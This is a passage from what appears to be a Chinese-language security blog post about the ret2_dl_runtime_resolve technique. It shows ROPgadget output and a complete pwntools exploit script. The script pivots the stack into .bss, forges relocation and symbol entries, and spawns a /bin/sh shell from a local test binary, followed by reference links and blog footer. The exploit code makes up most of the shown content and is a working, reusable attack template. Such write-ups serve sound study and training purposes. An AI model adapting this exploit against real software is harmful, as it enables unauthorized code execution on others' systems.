+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Gadgets information</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">0x0804853b : pop ebp ; ret</span><br><span class="line">0x08048538 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0804830d : pop ebx ; ret</span><br><span class="line">0x0804853a : pop edi ; pop ebp ; ret</span><br><span class="line">0x08048539 : pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080482f6 : ret</span><br><span class="line">0x080481aa : ret 0x2c5</span><br><span class="line">0x080483ee : ret 0xeac1</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary test --only &quot;leave|ret&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Gadgets information</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">0x080483d8 : leave ; ret</span><br><span class="line">0x080482f6 : ret</span><br><span class="line">0x080481aa : ret 0x2c5</span><br><span class="line">0x080483ee : ret 0xeac1</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 4</span><br></pre></td></tr></table></figure>
+<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">#coding&#x3D;utf-8</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;test&#39;)</span><br><span class="line">read_plt &#x3D; elf.plt[&#39;read&#39;]</span><br><span class="line">write_plt &#x3D; elf.plt[&#39;write&#39;]</span><br><span class="line"></span><br><span class="line">ppp_ret &#x3D; 0x08048539 #pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">pop_ebp_ret &#x3D; 0x0804853b</span><br><span class="line">leave_ret &#x3D; 0x080483d8</span><br><span class="line"></span><br><span class="line">stack_size &#x3D; 0x800    #迁移栈后栈的大小</span><br><span class="line">bss_addr &#x3D; 0x0804a024 # readelf -S test | grep &quot;.bss&quot;</span><br><span class="line">stack_addr &#x3D; bss_addr + stack_size</span><br><span class="line"></span><br><span class="line">p &#x3D; process(&#39;.&#x2F;test&#39;)</span><br><span class="line"></span><br><span class="line">#迁移栈至bss+stack_size</span><br><span class="line">#read(0,stack_addr,100)</span><br><span class="line">p.recvuntil(&#39;Kirin\n&#39;)</span><br><span class="line">payload &#x3D; &#39;A&#39; * 28</span><br><span class="line">payload +&#x3D; p32(read_plt) </span><br><span class="line">payload +&#x3D; p32(ppp_ret)</span><br><span class="line">payload +&#x3D; p32(0)</span><br><span class="line">payload +&#x3D; p32(stack_addr)</span><br><span class="line">payload +&#x3D; p32(100)</span><br><span class="line">payload +&#x3D; p32(pop_ebp_ret) # 把stack_addr pop到ebp中</span><br><span class="line">payload +&#x3D; p32(stack_addr)</span><br><span class="line">payload +&#x3D; p32(leave_ret) # mov esp, ebp ; pop ebp ;将esp指向stack_addr</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">plt_0 &#x3D; 0x08048310</span><br><span class="line">rel_plt &#x3D; 0x080482cc</span><br><span class="line">index_offset &#x3D; (stack_addr + 28) - rel_plt</span><br><span class="line">write_got &#x3D; elf.got[&#39;write&#39;]</span><br><span class="line">dynsym_addr &#x3D; 0x080481cc</span><br><span class="line">dynstr_addr &#x3D; 0x0804823c</span><br><span class="line">hack_dynsym_addr &#x3D; stack_addr + 36</span><br><span class="line">align &#x3D; 0x10 - ((hack_dynsym_addr - dynsym_addr) &amp; 0xf)</span><br><span class="line">hack_dynsym_addr &#x3D; hack_dynsym_addr + align</span><br><span class="line">index_dynsym_addr &#x3D; (hack_dynsym_addr - dynsym_addr) &#x2F; 0x10       #dynsym下标</span><br><span class="line">r_info &#x3D; (index_dynsym_addr &lt;&lt; 8) | 0x7</span><br><span class="line">hack_rel &#x3D; p32(write_got) + p32(r_info)             #伪造reloc段</span><br><span class="line">st_name &#x3D; (hack_dynsym_addr + 0x10) - dynstr_addr</span><br><span class="line">hack_dynsym &#x3D; p32(st_name) + p32(0) + p32(0) + p32(0x12)    #伪造dynsym段</span><br><span class="line"></span><br><span class="line">#system(&quot;&#x2F;bin&#x2F;sh&quot;)</span><br><span class="line">payload2 &#x3D; &#39;AAAA&#39;</span><br><span class="line">payload2 +&#x3D; p32(plt_0)</span><br><span class="line">payload2 +&#x3D; p32(index_offset)</span><br><span class="line">payload2 +&#x3D; &#39;AAAA&#39;</span><br><span class="line">payload2 +&#x3D; p32(stack_addr + 80)</span><br><span class="line">payload2 +&#x3D; &#39;AAAA&#39;</span><br><span class="line">payload2 +&#x3D; &#39;AAAA&#39;</span><br><span class="line">payload2 +&#x3D; hack_rel # stack_addr+28</span><br><span class="line">payload2 +&#x3D; &#39;A&#39; * align</span><br><span class="line">payload2 +&#x3D; hack_dynsym # stack_addr+36+align</span><br><span class="line">payload2 +&#x3D; &quot;system\x00&quot;</span><br><span class="line">payload2 +&#x3D; &#39;A&#39; * (80 - len(payload2))</span><br><span class="line">payload2 +&#x3D; &quot;&#x2F;bin&#x2F;sh\x00&quot;</span><br><span class="line">payload2 +&#x3D; &#39;A&#39; * (100 - len(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><strong><em>参考文档</em></strong>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;pwn4.fun&#x2F;2016&#x2F;11&#x2F;09&#x2F;Return-to-dl-resolve&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;bbs.pediy.com&#x2F;thread-227034.htm</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-程序示例"><span class="toc-number">1.</span> <span class="toc-text">0x01 程序示例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#write调用过程"><span class="toc-number">1.1.</span> <span class="toc-text">write调用过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-Section信息"><span class="toc-number">2.</span> <span class="toc-text">0x02 Section信息</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#dynamic"><span class="toc-number">2.1.</span> <span class="toc-text">.dynamic</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dynstr"><span class="toc-number">2.2.</span> <span class="toc-text">.dynstr</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dynsym"><span class="toc-number">2.3.</span> <span class="toc-text">.dynsym</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rel-plt"><span class="toc-number">2.4.</span> <span class="toc-text">.rel.plt</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#延迟绑定"><span class="toc-number">2.5.</span> <span class="toc-text">延迟绑定</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dl-runtime-resolve"><span class="toc-number">2.6.</span> <span class="toc-text">_dl_runtime_resolve</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-漏洞利用"><span class="toc-number">3.</span> <span class="toc-text">0x03 漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ROP："><span class="toc-number">3.1.</span> <span class="toc-text">ROP：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#改写section信息"><span class="toc-number">3.2.</span> <span class="toc-text">改写section信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04-利用示例"><span class="toc-number">3.3.</span> <span class="toc-text">0x04 利用示例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ROP链信息："><span class="toc-number">3.4.</span> <span class="toc-text">ROP链信息：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP"><span class="toc-number">3.5.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/08/18/ret2-dl-runtime-resolve/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/08/18/ret2-dl-runtime-resolve/&text=ret2_dl_runtime_resolve" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/08/18/ret2-dl-runtime-resolve/&title=ret2_dl_runtime_resolve" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/08/18/ret2-dl-runtime-resolve/&is_video=false&description=ret2_dl_runtime_resolve" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ret2_dl_runtime_resolve&body=Check out this article: http://yoursite.com/2018/08/18/ret2-dl-runtime-resolve/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/08/18/ret2-dl-runtime-resolve/&title=ret2_dl_runtime_resolve" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/08/18/ret2-dl-runtime-resolve/&title=ret2_dl_runtime_resolve" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/08/18/ret2-dl-runtime-resolve/&title=ret2_dl_runtime_resolve" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/08/18/ret2-dl-runtime-resolve/&title=ret2_dl_runtime_resolve" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/08/18/ret2-dl-runtime-resolve/&name=ret2_dl_runtime_resolve&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 Kirin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
